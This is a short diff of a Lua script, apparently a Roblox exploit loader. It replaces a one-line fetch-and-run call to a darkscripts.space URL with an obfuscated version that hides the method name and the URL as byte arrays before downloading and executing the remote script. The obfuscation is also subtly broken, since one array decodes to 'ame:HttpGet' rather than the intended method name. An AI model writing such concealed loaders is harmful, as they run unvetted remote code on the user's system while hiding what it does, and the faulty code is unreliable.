@@ -1,1 +1,30 @@
-loadstring(game:HttpGet('https://darkscripts.space/scripts/60768492-a81a-4367-ad44-d67f23527668_1007550716501565482.lua',true))()
+local _ = string.char;
+local __ = tonumber;
+local ___ = string.reverse;
+local ____ = table.concat;
+local _____ = string.gsub;
+local ______ = string.byte;
+local _______ = string.sub;
+
+local a = ({97, 109, 101, 58, 72, 116, 116, 112, 71, 101, 116})
+local b = ({104, 116, 116, 112, 115, 58, 47, 47, 100, 97, 114, 107, 115, 99, 114, 105, 112, 116, 115, 46, 115, 112, 97, 99, 101, 47, 115, 99, 114, 105, 112, 116, 115, 47, 54, 48, 55, 54, 56, 52, 57, 50, 45, 97, 56, 49, 97, 45, 52, 51, 54, 55, 45, 97, 100, 52, 52, 45, 100, 54, 55, 102, 50, 51, 53, 50, 55, 54, 54, 56, 95, 49, 48, 48, 55, 53, 53, 48, 55, 49, 54, 53, 48, 49, 53, 54, 53, 52, 56, 50, 46, 108, 117, 97})
+
+local c = true
+
+local d = loadstring
+local e = game
+
+local f = {}
+for i, v in ipairs(b) do
+    f[i] = _(v)
+end
+
+local g = {}
+for i, v in ipairs(a) do
+    g[i] = _(v)
+end
+
+local h = ____ (g)
+local i = ____ (f)
+
+d(e[h](e, i, c))()
